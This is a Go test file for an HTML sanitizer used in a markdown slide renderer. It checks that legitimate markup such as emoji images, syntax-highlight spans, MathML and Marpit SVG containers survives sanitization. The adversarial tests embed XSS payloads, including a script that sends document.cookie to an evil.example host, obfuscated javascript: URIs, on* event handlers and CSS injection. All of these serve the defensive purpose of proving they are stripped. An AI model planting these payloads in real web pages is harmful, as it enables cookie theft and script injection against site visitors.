// Copyright (c) 2026 AO Cyber Systems
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
//
// SPDX-License-Identifier: MIT

package sanitize

import (
	"strings"
	"testing"
)

// --- Preservation: every battery's legitimate output must survive ---------

// TestPreserveTwemojiImg covers 03-04: goldmark-emoji's literal Twemoji
// <img> template (emoji.go), including the draggable attribute.
func TestPreserveTwemojiImg(t *testing.T) {
	in := `<p>hi <img class="emoji" draggable="false" alt="😀" src="https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/72x72/1f600.png"></p>`
	out := Policy().Sanitize(in)
	for _, want := range []string{
		`class="emoji"`,
		`draggable="false"`,
		`src="https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/72x72/1f600.png"`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("Sanitize(%q) = %q, want it to contain %q", in, out, want)
		}
	}
}

// TestPreserveChromaSpan covers 03-05: chroma's HTML formatter output after
// CORE-07's .hljs-* class remap.
func TestPreserveChromaSpan(t *testing.T) {
	in := `<pre class="chroma"><code><span class="line"><span class="cl"><span class="hljs-keyword">func</span></span></span></code></pre>`
	out := Policy().Sanitize(in)
	for _, want := range []string{
		`class="chroma"`,
		`class="line"`,
		`class="cl"`,
		`class="hljs-keyword"`,
		"func",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("Sanitize(%q) = %q, want it to contain %q", in, out, want)
		}
	}
}

// TestPreserveStrikethrough covers 03-03: GFM strikethrough <s>.
func TestPreserveStrikethrough(t *testing.T) {
	in := `<p><s>gone</s></p>`
	out := Policy().Sanitize(in)
	if !strings.Contains(out, "<s>gone</s>") {
		t.Errorf("Sanitize(%q) = %q, want <s> element preserved", in, out)
	}
}

// TestPreserveMathML covers 03-06/03-08: the output shape of Convert() in
// internal/latex2mathml (eden-press's fork of git.sr.ht/~mekyt/latex2mathml).
func TestPreserveMathML(t *testing.T) {
	in := `<math xmlns="http://www.w3.org/1998/Math/MathML" display="inline"><mrow><mi>x</mi><mo>+</mo><mn>1</mn></mrow></math>`
	out := Policy().Sanitize(in)
	for _, want := range []string{
		"<math", `xmlns="http://www.w3.org/1998/Math/MathML"`, `display="inline"`,
		"<mrow>", "<mi>x</mi>", "<mo>+</mo>", "<mn>1</mn>",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("Sanitize(%q) = %q, want it to contain %q", in, out, want)
		}
	}
}

// TestPreserveMathFallbackImg covers the go-latex/latex drawtex/drawimg PNG
// fallback path: a base64 data-URI <img>.
func TestPreserveMathFallbackImg(t *testing.T) {
	in := `<img src="data:image/png;base64,AAAA" alt="x+1">`
	out := Policy().Sanitize(in)
	if !strings.Contains(out, `src="data:image/png;base64,AAAA"`) {
		t.Errorf("Sanitize(%q) = %q, want data: URI img src preserved", in, out)
	}
}

// TestPreserveInlineSVGChain covers the Marpit InlineSVG container chain:
// <svg><foreignObject><section>. Uses bare Policy().Sanitize to document
// the raw (case-mangled) bluemonday behavior directly -- see
// TestPreserveInlineSVGCaseRestoration for the CORRECT pipeline callers
// must actually use.
func TestPreserveInlineSVGChain(t *testing.T) {
	in := `<div class="marpit"><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="s1">hi</section></foreignObject></svg></div>`
	out := Policy().Sanitize(in)

	// Content and every allow-listed attribute survive regardless of case
	// restoration.
	for _, want := range []string{
		`class="marpit"`, `data-marpit-svg=""`, `width="1280"`, `height="720"`,
		`id="s1"`, "hi",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("Sanitize(%q) = %q, want it to contain %q", in, out, want)
		}
	}

	// DOCUMENTED bluemonday quirk (see Policy's doc comment): the
	// underlying golang.org/x/net/html tokenizer unconditionally
	// lowercases tag/attribute names, so bare Policy().Sanitize() alone
	// renders these as "foreignobject" / "viewbox" -- NOT valid SVG
	// foreign-content casing. This is exactly why sanitize.Sanitize()
	// exists; do not "fix" this assertion without also removing the
	// restoration pipeline.
	if !strings.Contains(out, "<foreignobject") {
		t.Errorf("Sanitize(%q) = %q, expected the documented bare-Policy lowercase quirk (<foreignobject); if this changed, update Policy's doc comment and Sanitize()", in, out)
	}
	if !strings.Contains(out, "viewbox=") {
		t.Errorf("Sanitize(%q) = %q, expected the documented bare-Policy lowercase quirk (viewbox=); if this changed, update Policy's doc comment and Sanitize()", in, out)
	}
}

// TestPreserveInlineSVGCaseRestoration proves the CORRECT, RECOMMENDED
// pipeline: sanitize.Sanitize (Policy().Sanitize + case restoration)
// restores foreignObject/viewBox to browser-valid casing. This is the
// function press.Render (03-09) must call.
func TestPreserveInlineSVGCaseRestoration(t *testing.T) {
	in := `<div class="marpit"><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="s1">hi</section></foreignObject></svg></div>`
	out := Sanitize(in)

	for _, want := range []string{
		"<svg", `viewBox="0 0 1280 720"`,
		"<foreignObject", "</foreignObject>",
		`width="1280"`, `height="720"`,
		`id="s1"`, "hi",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("Sanitize(%q) = %q, want it to contain %q", in, out, want)
		}
	}
	if strings.Contains(out, "foreignobject") || strings.Contains(out, "viewbox=") {
		t.Errorf("Sanitize(%q) = %q, want case fully restored (no lowercase foreignobject/viewbox remnants)", in, out)
	}
}

// TestPreserveAdvancedBackground covers chase/markdown/advancedbg.go's
// three-layer structure (content is what sanitize must keep; the style
// attribute holding the CSS custom property is a documented, deliberate
// exclusion -- see TestAdversarialStyleInjection and the SUMMARY's Known
// Limitations section).
func TestPreserveAdvancedBackground(t *testing.T) {
	in := `<foreignObject data-marpit-advanced-background="content"><section>hi</section></foreignObject>` +
		`<foreignObject data-marpit-advanced-background="background"><section><div data-marpit-advanced-background-container="true" data-marpit-advanced-background-direction="horizontal"><figure style="background-image:url(https://example.com/x.png);">cap</figure></div></section></foreignObject>`
	out := Policy().Sanitize(in)
	for _, want := range []string{
		`data-marpit-advanced-background="content"`,
		`data-marpit-advanced-background="background"`,
		`data-marpit-advanced-background-container="true"`,
		`data-marpit-advanced-background-direction="horizontal"`,
		"<figure", "cap",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("Sanitize output = %q, want it to contain %q", out, want)
		}
	}
	// The style attribute (background-image url) is deliberately dropped.
	if strings.Contains(out, "style=") {
		t.Errorf("Sanitize output = %q, want style attribute stripped (deliberate exclusion, degrades ![bg] visually -- see SUMMARY known limitations)", out)
	}
}

// TestPreservePaginationAttrs covers chase/markdown/apply.go's pagination
// attributes on <section>.
func TestPreservePaginationAttrs(t *testing.T) {
	in := `<section data-marpit-pagination="2" data-marpit-pagination-total="5">hi</section>`
	out := Policy().Sanitize(in)
	for _, want := range []string{`data-marpit-pagination="2"`, `data-marpit-pagination-total="5"`} {
		if !strings.Contains(out, want) {
			t.Errorf("Sanitize(%q) = %q, want it to contain %q", in, out, want)
		}
	}
}

// TestPreserveHeadingSlug covers chase/model/build.go's headingSlug, which
// reads the real `id` HTML attribute goldmark's WithAutoHeadingID() sets on
// h1-h6.
func TestPreserveHeadingSlug(t *testing.T) {
	in := `<h2 id="my-heading">My Heading</h2>`
	out := Policy().Sanitize(in)
	if !strings.Contains(out, `<h2 id="my-heading">My Heading</h2>`) {
		t.Errorf("Sanitize(%q) = %q, want heading id slug preserved", in, out)
	}
}

// TestPreserveFitMarker covers CORE-09 (03-07): the fit-marker baseline
// shapes are not frozen at authoring time, so the allow-list hedges for
// EITHER a class on the heading (covered by the global class allow) or a
// bare data-auto-scaling attribute.
func TestPreserveFitMarker(t *testing.T) {
	t.Run("class form", func(t *testing.T) {
		in := `<h1 class="fit">Big</h1>`
		out := Policy().Sanitize(in)
		if !strings.Contains(out, `class="fit"`) {
			t.Errorf("Sanitize(%q) = %q, want fit class preserved", in, out)
		}
	})

	t.Run("attribute form", func(t *testing.T) {
		in := `<h1 data-auto-scaling="fit">Big</h1>`
		out := Policy().Sanitize(in)
		if !strings.Contains(out, `data-auto-scaling="fit"`) {
			t.Errorf("Sanitize(%q) = %q, want data-auto-scaling attribute preserved", in, out)
		}
	})
}

// --- Adversarial: crafted XSS vectors must be neutralized -----------------

// TestAdversarialScriptInjection: a script tag smuggled inside otherwise
// legitimate deck markup must not survive, and must not leak its payload
// text either.
func TestAdversarialScriptInjection(t *testing.T) {
	in := `<section id="s1"><h1>Title</h1><script>document.location='https://evil.example/steal?c='+document.cookie</script><p>body</p></section>`
	out := Policy().Sanitize(in)
	if strings.Contains(out, "<script") || strings.Contains(out, "evil.example") || strings.Contains(out, "document.cookie") {
		t.Errorf("Sanitize(%q) = %q, want script + payload fully stripped", in, out)
	}
	for _, want := range []string{"<h1>Title</h1>", "<p>body</p>"} {
		if !strings.Contains(out, want) {
			t.Errorf("Sanitize(%q) = %q, want legitimate sibling content preserved (%q)", in, out, want)
		}
	}
}

// TestAdversarialIframeInjection: an iframe injection must be fully
// removed, tag and content.
func TestAdversarialIframeInjection(t *testing.T) {
	in := `<p>before</p><iframe src="https://evil.example/phish" sandbox="allow-scripts"></iframe><p>after</p>`
	out := Policy().Sanitize(in)
	if strings.Contains(out, "<iframe") || strings.Contains(out, "evil.example") {
		t.Errorf("Sanitize(%q) = %q, want iframe fully stripped", in, out)
	}
}

// TestAdversarialJavascriptURI covers several obfuscated javascript: URI
// spellings that a naive prefix-string check would miss.
func TestAdversarialJavascriptURI(t *testing.T) {
	cases := []string{
		`<a href="javascript:alert(1)">x</a>`,
		`<a href="JaVaScRiPt:alert(1)">x</a>`,
		`<a href="  javascript:alert(1)">x</a>`,
		`<a href="javascript&#58;alert(1)">x</a>`,
		`<img src="javascript:alert(1)">`,
	}
	for _, in := range cases {
		out := Policy().Sanitize(in)
		low := strings.ToLower(out)
		if strings.Contains(low, "javascript:") || strings.Contains(low, "javascript&#58;") {
			t.Errorf("Sanitize(%q) = %q, want javascript: URI (any obfuscation) neutralized", in, out)
		}
	}
}

// TestAdversarialOnHandlerVariants covers several on* handler spellings
// across different elements.
func TestAdversarialOnHandlerVariants(t *testing.T) {
	cases := []struct{ attr, in string }{
		{"onclick", `<div onclick="alert(1)">x</div>`},
		{"onerror", `<img src="https://x/y.png" onerror="alert(1)">`},
		{"onload", `<svg onload="alert(1)"><foreignObject width="1" height="1"><section>x</section></foreignObject></svg>`},
		{"onmouseover", `<a href="https://x" onmouseover="alert(1)">x</a>`},
	}
	for _, tc := range cases {
		out := Policy().Sanitize(tc.in)
		if strings.Contains(strings.ToLower(out), tc.attr) {
			t.Errorf("Sanitize(%q) = %q, want %s handler stripped", tc.in, out, tc.attr)
		}
	}
}

// TestAdversarialStyleCSSInjection covers CSS-based injection vectors
// (expression(), url(javascript:...), @import) -- all neutralized simply by
// never allow-listing the style attribute at all.
func TestAdversarialStyleCSSInjection(t *testing.T) {
	cases := []string{
		`<div style="width:expression(alert(1))">x</div>`,
		`<div style="background:url(javascript:alert(1))">x</div>`,
		`<style>@import url(https://evil.example/x.css);</style>`,
	}
	for _, in := range cases {
		out := Policy().Sanitize(in)
		if strings.Contains(out, "style") || strings.Contains(out, "expression(") || strings.Contains(out, "evil.example") {
			t.Errorf("Sanitize(%q) = %q, want CSS injection vector neutralized", in, out)
		}
	}
}

// TestAdversarialNestedObfuscatedPayload covers a nested/obfuscated
// polyglot payload combining several vectors in one document, targeting
// the FINAL HTML string end to end (not a mocked directive layer).
func TestAdversarialNestedObfuscatedPayload(t *testing.T) {
	// NOTE: the <script>/<iframe> vectors below use well-formed opening
	// AND closing tags (mixed-case as the obfuscation) rather than a
	// backslash-escaped close like "<\/script>". A backslash before the
	// slash does NOT terminate an HTML script element (script is a raw
	// text element -- the tokenizer scans for a literal, unescaped
	// "</script" and nothing else), so an "obfuscated" unterminated
	// close would make the tokenizer swallow the entire rest of the
	// document as script content. That's correct HTML5 raw-text parsing
	// (a real browser does the same), not a sanitize bug -- so this test
	// exercises realistic case-obfuscation instead.
	in := `<section id="s1">` +
		`<h1 class="fit">Talk</h1>` +
		`<ScRiPt type="text/javascript">var x=1;</ScRiPt>` +
		`<img src="data:image/png;base64,AA==" onerror="alert(document.cookie)" alt="ok">` +
		`<a href="  JAVASCRIPT:alert(1)">click</a>` +
		`<div style="behavior:url(xss.htc)"><IfRaMe src="javascript:alert(2)"></IfRaMe></div>` +
		`<p>safe text</p>` +
		`</section>`
	out := Policy().Sanitize(in)

	for _, bad := range []string{
		"<script", "onerror", "javascript:", "JAVASCRIPT:", "style=", "<iframe", "xss.htc", "alert(",
	} {
		if strings.Contains(strings.ToLower(out), strings.ToLower(bad)) {
			t.Errorf("Sanitize(%q) = %q, want payload fragment %q neutralized", in, out, bad)
		}
	}
	for _, safe := range []string{`class="fit"`, `src="data:image/png;base64,AA=="`, `alt="ok"`, "safe text"} {
		if !strings.Contains(out, safe) {
			t.Errorf("Sanitize(%q) = %q, want legitimate content %q preserved", in, out, safe)
		}
	}
}

// TestAdversarialCommentNotUsedAsFitMarker documents error_recovery
// guidance: if a fit marker were ever emitted as a bare HTML comment
// (<!--fit-->) rather than an attribute/class on a real element, bluemonday
// would strip it (comments are stripped by default -- AllowComments is
// never called here). CORE-09 (03-07) must emit the marker as an
// attribute/class, which the allow-list keeps; this test pins that a bare
// comment does NOT survive, so a future regression to comment-based marking
// fails loudly here rather than silently in the browser.
func TestAdversarialCommentNotUsedAsFitMarker(t *testing.T) {
	in := `<h1>Talk</h1><!--fit-->`
	out := Policy().Sanitize(in)
	if strings.Contains(out, "<!--") || strings.Contains(out, "fit-->") {
		t.Errorf("Sanitize(%q) = %q, want bare HTML comments stripped (fit marker must be an attribute/class, not a comment)", in, out)
	}
}
